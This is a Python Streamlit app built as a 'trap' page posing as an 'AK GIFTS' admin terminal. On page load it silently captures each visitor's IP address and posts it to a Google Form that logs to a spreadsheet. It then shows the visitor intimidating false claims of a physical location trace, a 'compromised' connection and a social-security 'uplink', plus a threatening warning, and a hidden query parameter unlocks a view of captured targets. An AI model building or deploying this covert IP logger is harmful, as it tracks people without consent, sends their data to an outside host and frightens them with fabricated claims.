import streamlit as st
import requests
from datetime import datetime

# --- 1. PAGE CONFIG ---
st.set_page_config(page_title="AK GIFTS | Internal Security", page_icon="🛡️", layout="wide")

# --- 2. YOUR GOOGLE FORM CONFIG ---
# This sends the IP silently to your Google Sheet
FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSeL-8OqJ1WEUlBsTBcr_LVOJrngK-eHmRsSi7ufcfva10UHcA/formResponse?entry.444157392="

# --- 3. IP CAPTURE LOGIC ---
def get_ip():
    try:
        # Try native Streamlit context first (New for 2026)
        ip = st.context.ip_address
        # If it returns a local cloud IP, check headers for the real user IP
        if not ip or ip.startswith(("172.", "10.", "127.")):
            headers = st.context.headers
            ip = headers.get("X-Forwarded-For", "Unknown").split(",")[0].strip()
        return ip
    except:
        return "Unknown"

user_ip = get_ip()

# --- 4. SILENT LOGGING ---
if user_ip != "Unknown" and "logged" not in st.session_state:
    try:
        # Sends the IP to your Google Sheet via the Form
        requests.post(f"{FORM_URL}{user_ip}")
        st.session_state["logged"] = True
        # Also print to Streamlit 'Manage App' Logs as backup
        print(f"!!! TARGET CAPTURED: {user_ip} !!!")
    except Exception as e:
        print(f"Log Error: {e}")

# --- 5. VISUAL DASHBOARD (The Trap) ---
st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .warning-box {
        color: #ff4b4b;
        font-weight: bold;
        font-size: 28px;
        text-shadow: 0 0 10px #ff4b4b;
        border: 3px dashed #ff4b4b;
        padding: 30px;
        text-align: center;
        border-radius: 15px;
        background-color: rgba(255, 75, 75, 0.1);
    }
    </style>
    """, unsafe_allow_html=True)

st.title("🎁 AK GIFTS | ADMIN TERMINAL")
st.write("ENKODER SECURITY PROTOCOL V4.0")
st.divider()

st.markdown('<div class="warning-box">⚠️ YOUR SCAM HAVE BEEN COMING TO AN END BE SAFE MAN</div>', unsafe_allow_html=True)

st.write("")
st.write("")

col1, col2 = st.columns(2)
with col1:
    st.metric(label="YOUR DETECTED IP", value=user_ip)
    st.info("Physical Location Trace: ACTIVE")

with col2:
    st.metric(label="CONNECTION STATUS", value="COMPROMISED", delta="-100%")
    st.error("Uplink to Social Security 'Aleena' established.")

# --- 6. ADMIN VIEW ---
# To see this, visit: your-app.streamlit.app/?admin=true
if st.query_params.get("admin") == "true":
    st.divider()
    st.subheader("🕵️ ENKODER LIVE MONITOR")
    st.success(f"Current Target: {user_ip}")
    st.write("All historical IPs are being saved to your **Google Sheet**.")
    st.write("Check your Google Form 'Responses' tab to see the full list.")
